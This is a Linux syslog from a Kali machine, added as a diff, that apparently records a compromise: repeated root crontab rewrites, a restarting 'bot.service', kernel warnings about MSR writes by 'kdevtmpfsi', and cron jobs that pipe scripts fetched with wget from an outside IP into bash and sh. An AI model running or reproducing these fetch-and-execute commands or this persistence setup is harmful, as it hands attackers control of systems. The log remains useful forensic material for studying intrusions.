@@ -1,0 +1,459 @@
+Jan 11 01:44:36 kali rsyslogd: [origin software="rsyslogd" swVersion="8.2010.0" x-pid="625" x-info="https://www.rsyslog.com"] rsyslogd was HUPed
+Jan 11 01:44:36 kali rsyslogd: [origin software="rsyslogd" swVersion="8.2010.0" x-pid="625" x-info="https://www.rsyslog.com"] rsyslogd was HUPed
+Jan 11 01:44:36 kali systemd[1]: logrotate.service: Succeeded.
+Jan 11 01:44:36 kali systemd[1]: Finished Rotate log files.
+Jan 11 01:44:36 kali systemd[1]: man-db.service: Succeeded.
+Jan 11 01:44:36 kali systemd[1]: Finished Daily man-db regeneration.
+Jan 11 01:44:40 kali systemd[1]: systemd-rfkill.service: Succeeded.
+Jan 11 01:45:12 kali CRON[2829]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Jan 11 01:47:32 kali dbus-daemon[1111]: [session uid=0 pid=1111] Activating service name='org.freedesktop.thumbnails.Cache1' requested by ':1.16' (uid=0 pid=1235 comm="Thunar --daemon ")
+Jan 11 01:47:32 kali org.freedesktop.thumbnails.Cache1[2840]: Registered thumbnailer /usr/bin/gdk-pixbuf-thumbnailer -s %s %u %o
+Jan 11 01:47:32 kali org.freedesktop.thumbnails.Cache1[2840]: Registered thumbnailer atril-thumbnailer -s %s %u %o
+Jan 11 01:47:32 kali org.freedesktop.thumbnails.Cache1[2840]: Registered thumbnailer /usr/bin/gdk-pixbuf-thumbnailer -s %s %u %o
+Jan 11 01:47:32 kali dbus-daemon[1111]: [session uid=0 pid=1111] Successfully activated service 'org.freedesktop.thumbnails.Cache1'
+Jan 11 01:47:50 kali systemd[1]: Reloading.
+Jan 11 01:47:50 kali systemd[1]: /lib/systemd/system/plymouth-start.service:16: Unit configured to use KillMode=none. This is unsafe, as it disables systemd's process lifecycle management for the service. Please update your service to use a safer KillMode=, such as 'mixed' or 'control-group'. Support for KillMode=none is deprecated and will eventually be removed.
+Jan 11 01:47:50 kali systemd[1]: /lib/systemd/system/smartmontools.service:10: Standard output type syslog is obsolete, automatically updating to journal. Please update your unit file, and consider removing the setting altogether.
+Jan 11 01:47:50 kali systemd[1]: /lib/systemd/system/docker.socket:5: ListenStream= references a path below legacy directory /var/run/, updating /var/run/docker.sock → /run/docker.sock; please update the unit file accordingly.
+Jan 11 01:47:50 kali systemd[1]: Starting Discard unused blocks on filesystems from /etc/fstab...
+Jan 11 01:47:50 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:47:50 kali systemd[1]: fstrim.service: Succeeded.
+Jan 11 01:47:50 kali systemd[1]: Finished Discard unused blocks on filesystems from /etc/fstab.
+Jan 11 01:47:51 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:47:51 kali crontab[3004]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3006]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3013]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3015]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3016]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3018]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3019]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3021]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3022]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3024]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3025]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3027]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3028]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3030]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3031]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3033]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3034]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3036]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3038]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3040]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3041]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3043]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3044]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3046]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3047]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3049]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3050]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3052]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3053]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3055]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3056]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3058]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3059]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3061]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3062]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3064]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3065]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3067]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3068]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3070]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3071]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3073]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3074]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3076]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3077]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3079]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3080]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3082]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3083]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3085]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3086]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3088]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3089]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3091]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3092]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3094]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3095]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3097]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3098]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3100]: (root) REPLACE (root)
+Jan 11 01:47:51 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:47:51 kali crontab[3101]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3103]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3104]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3106]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3107]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3109]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3110]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3112]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3113]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3115]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3116]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3118]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3119]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3121]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3122]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3124]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3125]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3127]: (root) REPLACE (root)
+Jan 11 01:47:51 kali crontab[3128]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3133]: (root) LIST (root)
+Jan 11 01:47:51 kali crontab[3132]: (root) REPLACE (root)
+Jan 11 01:47:55 kali crontab[3140]: (root) LIST (root)
+Jan 11 01:48:01 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 1.
+Jan 11 01:48:01 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:48:01 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:48:01 kali CRON[3153]: (root) CMD (wget -q -O - http://195.3.146.118/xx.sh | bash > /dev/null 2>&1)
+Jan 11 01:48:01 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:48:02 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:48:12 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 2.
+Jan 11 01:48:12 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:48:12 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:48:12 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:48:12 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:48:23 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 3.
+Jan 11 01:48:23 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:48:23 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:48:23 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:48:23 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:48:33 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 4.
+Jan 11 01:48:33 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:48:33 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:48:34 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:48:34 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:48:44 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 5.
+Jan 11 01:48:44 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:48:44 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:48:44 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:48:45 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:48:52 kali kernel: [  884.028354] msr: Write to unrecognized MSR 0x1a4 by kdevtmpfsi
+Jan 11 01:48:52 kali kernel: [  884.028354] Please report to x86@kernel.org
+Jan 11 01:48:52 kali kernel: [  884.028580] msr: Write to unrecognized MSR 0x1a4 by kdevtmpfsi
+Jan 11 01:48:52 kali kernel: [  884.028580] Please report to x86@kernel.org
+Jan 11 01:48:52 kali kernel: [  884.030124] msr: Write to unrecognized MSR 0x1a4 by kdevtmpfsi
+Jan 11 01:48:52 kali kernel: [  884.030124] Please report to x86@kernel.org
+Jan 11 01:48:52 kali kernel: [  884.030766] msr: Write to unrecognized MSR 0x1a4 by kdevtmpfsi
+Jan 11 01:48:52 kali kernel: [  884.030766] Please report to x86@kernel.org
+Jan 11 01:48:55 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 6.
+Jan 11 01:48:55 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:48:55 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:48:55 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:48:56 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:49:01 kali CRON[3280]: (root) CMD (wget -q -O - http://195.3.146.118/xx.sh | bash > /dev/null 2>&1)
+Jan 11 01:49:06 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 7.
+Jan 11 01:49:06 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:49:06 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:49:06 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:49:07 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:49:13 kali systemd[1]: Starting Cleanup of Temporary Directories...
+Jan 11 01:49:13 kali systemd[1]: systemd-tmpfiles-clean.service: Succeeded.
+Jan 11 01:49:13 kali systemd[1]: Finished Cleanup of Temporary Directories.
+Jan 11 01:49:17 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 8.
+Jan 11 01:49:17 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:49:17 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:49:17 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:49:18 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:49:28 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 9.
+Jan 11 01:49:28 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:49:28 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:49:29 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:49:29 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:49:39 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 10.
+Jan 11 01:49:39 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:49:39 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:49:40 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:49:40 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:49:50 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 11.
+Jan 11 01:49:50 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:49:50 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:49:51 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:49:51 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:50:01 kali CRON[3384]: (root) CMD (wget -q -O - http://195.3.146.118/xx.sh | bash > /dev/null 2>&1)
+Jan 11 01:50:01 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 12.
+Jan 11 01:50:01 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:50:01 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:50:02 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:50:02 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:50:13 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 13.
+Jan 11 01:50:13 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:50:13 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:50:13 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:50:14 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:50:24 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 14.
+Jan 11 01:50:24 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:50:24 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:50:24 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:50:25 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:50:35 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 15.
+Jan 11 01:50:35 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:50:35 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:50:35 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:50:36 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:50:46 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 16.
+Jan 11 01:50:46 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:50:46 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:50:46 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:50:47 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:50:52 kali crontab[3490]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3492]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3493]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3495]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3496]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3498]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3499]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3501]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3502]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3504]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3505]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3507]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3508]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3510]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3511]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3513]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3514]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3516]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3517]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3519]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3520]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3522]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3523]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3525]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3526]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3528]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3529]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3531]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3532]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3534]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3535]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3537]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3538]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3540]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3541]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3543]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3544]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3546]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3547]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3549]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3550]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3552]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3553]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3555]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3556]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3558]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3559]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3561]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3562]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3564]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3565]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3567]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3568]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3570]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3571]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3573]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3574]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3576]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3577]: (root) LIST (root)
+Jan 11 01:50:52 kali crontab[3579]: (root) REPLACE (root)
+Jan 11 01:50:52 kali crontab[3580]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3582]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3583]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3585]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3586]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3588]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3589]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3591]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3592]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3594]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3595]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3597]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3598]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3600]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3601]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3603]: (root) REPLACE (root)
+Jan 11 01:50:53 kali crontab[3604]: (root) LIST (root)
+Jan 11 01:50:53 kali crontab[3606]: (root) REPLACE (root)
+Jan 11 01:50:57 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 17.
+Jan 11 01:50:57 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:50:57 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:50:57 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:50:58 kali crontab[3675]: (root) LIST (root)
+Jan 11 01:50:58 kali crontab[3680]: (root) LIST (root)
+Jan 11 01:50:58 kali crontab[3679]: (root) REPLACE (root)
+Jan 11 01:50:58 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:51:01 kali cron[618]: (root) RELOAD (crontabs/root)
+Jan 11 01:51:01 kali CRON[3682]: (root) CMD (wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1)
+Jan 11 01:51:08 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 18.
+Jan 11 01:51:08 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:51:08 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:51:08 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:51:09 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:51:19 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 19.
+Jan 11 01:51:19 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:51:19 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:51:19 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:51:20 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:51:30 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 20.
+Jan 11 01:51:30 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:51:30 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:51:31 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:51:31 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:51:41 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 21.
+Jan 11 01:51:41 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:51:41 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:51:41 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:51:42 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:51:52 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 22.
+Jan 11 01:51:52 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:51:52 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:51:53 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:51:53 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:52:01 kali CRON[3804]: (root) CMD (wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1)
+Jan 11 01:52:03 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 23.
+Jan 11 01:52:03 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:52:03 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:52:04 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:52:04 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:52:15 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 24.
+Jan 11 01:52:15 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:52:15 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:52:15 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:52:16 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:52:26 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 25.
+Jan 11 01:52:26 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:52:26 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:52:26 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:52:27 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:52:37 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 26.
+Jan 11 01:52:37 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:52:37 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:52:38 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:52:38 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:52:48 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 27.
+Jan 11 01:52:48 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:52:48 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:52:48 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:52:49 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:52:59 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 28.
+Jan 11 01:52:59 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:52:59 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:52:59 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:53:00 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:53:01 kali CRON[4013]: (root) CMD (wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1)
+Jan 11 01:53:10 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 29.
+Jan 11 01:53:10 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:53:10 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:53:10 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:53:11 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:53:21 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 30.
+Jan 11 01:53:21 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:53:21 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:53:22 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:53:22 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:53:32 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 31.
+Jan 11 01:53:32 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:53:32 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:53:33 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:53:33 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:53:43 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 32.
+Jan 11 01:53:43 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:53:43 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:53:44 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:53:44 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:53:54 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 33.
+Jan 11 01:53:54 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:53:54 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:53:55 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:53:55 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:54:01 kali CRON[4103]: (root) CMD (wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1)
+Jan 11 01:54:05 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 34.
+Jan 11 01:54:05 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:54:05 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:54:06 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:54:06 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:54:16 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 35.
+Jan 11 01:54:16 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:54:16 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:54:17 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:54:17 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:54:27 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 36.
+Jan 11 01:54:27 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:54:27 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:54:28 kali systemd[1]: Started Start daemon at boot time.
+Jan 11 01:54:28 kali systemd[1]: bot.service: Succeeded.
+Jan 11 01:54:36 kali rsyslogd: [origin software="rsyslogd" swVersion="8.2010.0" x-pid="625" x-info="https://www.rsyslog.com"] rsyslogd was HUPed
+Jan 11 01:54:38 kali systemd[1]: bot.service: Scheduled restart job, restart counter is at 37.
+Jan 11 01:54:38 kali systemd[1]: Stopped Start daemon at boot time.
+Jan 11 01:54:38 kali systemd[1]: Starting Start daemon at boot time...
+Jan 11 01:54:39 kali systemd[1]: Started Start daemon at boot time.
